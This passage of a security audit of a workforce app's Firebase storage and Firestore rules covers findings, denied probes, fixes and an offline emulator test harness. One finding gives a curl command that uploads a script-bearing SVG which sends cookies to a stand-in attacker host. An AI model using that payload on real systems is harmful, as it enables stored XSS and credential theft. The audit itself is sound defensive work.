**Why helpers do not stop it.** No role or ownership helper is consulted; only "is there a token".

**Impact.** Bulk download of signature images enables signature forgery on any internal document; profile photos + attendance selfies give a complete, enumerable facial-image corpus of the guard workforce — a severe privacy and fraud exposure, and one a single leaked low-privilege account converts into a full exfiltration.

**Fix.** `employees/{employeeKey}/signatures` and `/attendance` → `allow read: if isAdmin();` (attendance photos are already server-mediated for writes; serve them via signed URLs from the validated routes). `profilePictures` → scope to the owning guard or the operational roles that actually render them, not `isSignedIn()`.

---

### S-03 — `image/*` admits SVG; user-controlled `{folder}` and 100 MB limits
**Severity:** Medium
**Location:** `storage.rules:17–19`, `21–31`, `96–107` (`98–101`), `204–208`

```
17:    function isImage() {
18:      return request.resource.contentType.matches('image/.*');
19:    }
...
 98:      allow create: if isFieldOfficer() && request.auth.uid == uid && (
 99:        (folder == 'trainingReportFiles' && isAllowedTrainingSize() && isTrainingContent()) ||
100:        (folder != 'trainingReportFiles' && isAllowedSize() && isDocument())
...
204:    match /trainingModules/{fileName=**} {
205:      allow read: if isSignedIn();
206:      allow create, update: if isAdmin() && isAllowedTrainingSize() && isTrainingContent();
```

**Why it is wrong.** `image/.*` matches `image/svg+xml` (and `image/svg`, `image/xml`), so an uploader sets `Content-Type: image/svg+xml` and stores a script-bearing SVG that the bucket serves with that type. Combined with S-01's `isFieldOfficer()` read tier, FO-authored SVGs are directly fetchable by every FO; `trainingModules` (100 MB, admin-only write) serve to all signed-in users. `file.matches`/content-type strings are the only validation — no magic-byte check, no `Content-Disposition` control, and `{folder}` is a caller-chosen path segment.

**Concrete attacker request:**
```bash
# SVG with an embedded payload, served from the storage origin
curl -X POST -H "Authorization: Bearer $FO_ID_TOKEN" \
  -H "Content-Type: image/svg+xml" \
  --data-binary '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("//attacker.tld?c="+document.cookie)</script></svg>' \
  "https://firebasestorage.googleapis.com/v0/b/ciss-workforce.firebasestorage.app/o?name=foReports%2FvisitReportFiles%2F<uid>%2Fpayload.svg"
```
**Impact.** Stored XSS on the storage origin (not the app origin, so cookie theft of app sessions is not direct) → phishing pages and malicious-download delivery from a trusted Google-hosted domain; plus storage-cost abuse via 100 MB training uploads.

**Fix.** Replace `image/.*` with an explicit raster allowlist (`image/jpeg|png|webp|heic`); reject `image/svg+xml` and `image/xml`; add `Content-Disposition: attachment` at serve time; cap `trainingModules` size to the real maximum asset size.

---

### S-04 — Report-bound integrity checks exist only on one of the two `foReports` paths
**Severity:** Low (with S-01 raised to High)
**Location:** `storage.rules:80–93` vs `96–107`; `113–134`

The 4-segment rule requires `request.resource.metadata.reportId == reportId` and `metadata.uploaderId == uid` (`87–88`) and denies reads (`81`), whereas the 3-segment rule (`96–107`) requires neither, allows any path under the caller's uid, and lets `isAdmin()` update (`102`) with no draft/state check. Legacy employee reads (`113–134`) have no per-employee scoping and no size/content limits on the read path. Recorded so the two `foReports` shapes are not "fixed" independently and left inconsistent.

**Fix.** Unify on the report-bound shape; require metadata on both; delete the legacy prefix once the app stops writing it (`photo-capture.tsx:253`).

---

## 4. Verified-safe (checked and found correctly hardened)

Recording these so the Lead does not re-audit them. Each was confirmed by emulator probe or by exhaustive grep.

**Explicit server-only denies are real.** `employeeAadhaarPrivate` (`firestore.rules:201–203`), `sensitiveDocumentAuditLogs` (`205–207`), `employees/{id}/consents|documents|aadhaarCorrectionRequests` (`209–219`), `trainingModules`/`questionBanks`/`questions`/`quizAttempts`/`trainingAssignments`/`evaluations`/`guardScores`/`awards` (`374–404`), `resetOtps` (`470–472`), and every collection in the `517–587` server-only block (`foVisitReports`, `foTrainingReports`, `foReportEvents`, `branchExpenses`, `rateLimits`, `regionConnections`, `roleClaimRepairAudit`, `clientUserAudit`, `fieldOfficerAudit`, `employeeIds`, `enrollments`, `guardPatrolActivities`, `incidents`, `leaveRequests`, `notificationReadStates`, `regionAutomationJobs`, `workOrderImports`) — the app's comments match the rules; no client-side leak. Storage equivalents `restrictedEmployeeAadhaar`, `restrictedAadhaarStaging`, `restrictedEmployeeConsent` (`46–56`), `employees/*/aadharCards` (`164–166`), `enrollments/*/aadharCards` (`254–256`) and the `/{allPaths=**}` catch-all deny (`294–296`) are likewise correct.

**Negative probes (attacker attempts correctly denied):**

| Probe | Attempt | Result |
|-------|---------|--------|
| F2 | FO reads an employee outside `assignedDistricts` | 403 |
| F5 | client reads an `attendanceLog` of another client | 403 |
| F7 | guard reads another guard's `payrollEntries` | 403 |
| F10 | guard reads another guard's `attendanceSessions` | 403 |
| F13 | client reads `guardLocations` of another client | 403 |
| F14 | HR(KL) reads a TN employee | 403 |
| F15 | user reads another recipient's `notifications` | 403 |
| F19 | guard writes another uid's `fcmTokens` | 403 |
| F20 | FO updates an `employees` document | 403 |
| E1 | self-update `users/{uid}` with `role: 'admin'` | 403 |
| A1–A4 | claim-less guard-email token reads employees/attendanceState | 403 |
| B1 | real guard (no `assignedSiteId`) reads a foreign client | 403 |
| D2 | client reads another client's employee | 403 |

**Rules-language note (empirical).** Undefined-claim and undefined-field reads **error** rather than yielding `null` — e.g. probe A1 returns *"evaluation error at L188:22 … Property admin is undefined on object"*, probe C2 *"Property stateCode is undefined on object"*, probe B5 *"Null value error"*. Two consequences, both verified rather than assumed: (i) there is **no** `null == null` bypass of the `claim == resource.data.field` pattern (probes A1–A4 deny), and (ii) an error in an early `||` operand does **not** prevent a later true branch from allowing the request (probes D1, F1, F3, F4, F6, F8, F9 all allow through chains whose first operand errored). This is why `isAdmin()`'s undefined `admin` claim does not lock legitimate guard/FO/client paths out.

---

## 5. Needs-live-verification (cannot be settled from source alone)

1. **Is `assignedSiteId` ever populated on live guard tokens?** (R-04). Source and git history say the claim is never minted by this repo; an out-of-band console/admin script or an older deployed build could still set it. If yes → R-04 is an immediate Critical cross-tenant leak of `clients` + `clientLocations`; method: decode a live guard ID token, or replay probes B2–B4 against the deployed ruleset.
2. **Is Identity Toolkit email/password signup open?** (R-10). `POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<web API key>` with `supporter@guard.cisskerala.app` — if accepted, the email-based `isGuard()` arm is attacker-satisfiable (currently with no further access, per A1–A4, but it removes one control).
3. **Is more than one state live?** (R-03). Impact of the cross-state overwrite depends on `states/`, `regions/`, and documents carrying more than one distinct `stateCode`. The wizard writes `REGION_CODE` (`src/app/api/wizard/clients/route.ts:22,34`), so at minimum confirm whether non-KL data exists.
4. **Do live Storage objects exist under `/employees/*/signatures`, `/employees/*/attendance`, `/employees/*/profilePictures` and `foReports/<3-segment>`?** (S-01, S-02). Determines realised vs. potential exposure.
5. **Does the live deployed ruleset equal `firestore.rules`/`storage.rules` at `72b55601`?** Confirm via `firebase firestore:databases:get`/rules release history — every finding here is graded against the repo's ruleset.
6. **Is the `workOrderTodos` title/body rendered unsanitised?** (R-07) — decides whether that finding carries a stored-XSS escalation to admin.

---

## 6. Prioritised remediation order

1. **R-01 / R-02** — tighten the payroll/compliance write rules to their route gates (`isSuperAdmin()` for `complianceSettings`; `isAdmin()` for `clientWageConfig`, `payrollCycles`, `salaryStructures`, `employeeSalaries`). Small diffs, high integrity value.
2. **S-02** — take `signatures` and `attendance` photos off `isSignedIn()`; serve from validated server routes/signed URLs.
3. **S-01** — scope or delete the 3-segment `foReports` rule.
4. **R-04** — replace the `guardAssignedSiteId()` predicate with a real site/client comparison (or delete the branch), and make the claim contract explicit before anyone mints it.
5. **R-03** — make `writeStateMatches()` read `resource.data` for updates; require `stateCode` immutability.
6. **R-05, R-06** — district-scope `attendanceSessions`; move client-role employee reads to a projected server route.
7. **R-07, R-08, R-09, R-10, S-03** — allowlists/ownership, remove `true` reads and the email-suffix arm, raster-only content types.
8. **R-11, R-12, S-04** — delete dead rules and stale comments; decide the client-SDK-vs-rules split for `employees`/`workOrders` list views.

A compact regression suite exists in Appendix A — the ruleset can be exercised offline in ~30 seconds, which is worth wiring into CI given how much of this class of defect (R-03, R-04) is invisible to review but obvious to a probe.

---

## Appendix A — Offline reproduction harness

The emulator command used (arm64 JDK 21; the default `java` on this machine is an x86_64 Temurin build and fails with *"Bad CPU type in executable"*):

```bash
export JAVA_HOME=/Library/Java/JavaVirtualMachines/openjdk-21.jdk/Contents/Home
$JAVA_HOME/bin/java -jar ~/.cache/firebase/emulators/cloud-firestore-emulator-v1.22.0.jar \
  --host 127.0.0.1 --port 8081 --rules /Users/mymac/Documents/CISS/firestore.rules
```

Principals are unsigned JWTs (`alg: none`); the emulator maps the payload to `request.auth.token` and `sub`/`user_id` to `request.auth.uid`, so arbitrary custom-claim sets can be tested without touching the live project:

```js
const tok = (claims, uid) =>
  Buffer.from(JSON.stringify({alg:"none",typ:"JWT"})).toString("base64url") + "." +
  Buffer.from(JSON.stringify({iss:"probe",aud:"ciss-workforce",sub:uid,user_id:uid,
    iat:1700000000,exp:2000000000,...claims})).toString("base64url") + ".";
// writes/seeds as admin: Authorization: Bearer owner
// reads as a principal: Authorization: Bearer <tok>
```

Scripts: `/tmp/rules-probe.mjs` (groups A–E: claim/field-absence semantics, the `assignedSiteId` branch, cross-state writes, server-only collections, `users` self-update, public reads) and `/tmp/rules-probe2.mjs` (group F: error-propagation semantics and legitimate-path regression checks). Both print `ID | ALLOWED/DENIED | expect | description`; the expected values in the second script double as regression assertions for remediations.

Storage rules could not be exercised offline: the cached `cloud-storage-rules-runtime-v1.1.3.jar` reports *"This command is not currencly supported."* for `check` and rejects `serve --help`/`--ruleset`-only invocation, and `firebase-tools` is not installed in this workspace (`npx firebase` unavailable). S-01…S-04 are therefore source-confirmed predicates awaiting a live bucket check. `firestore.rules` and `storage.rules` were read-only throughout; no deployment or live-site request was made.
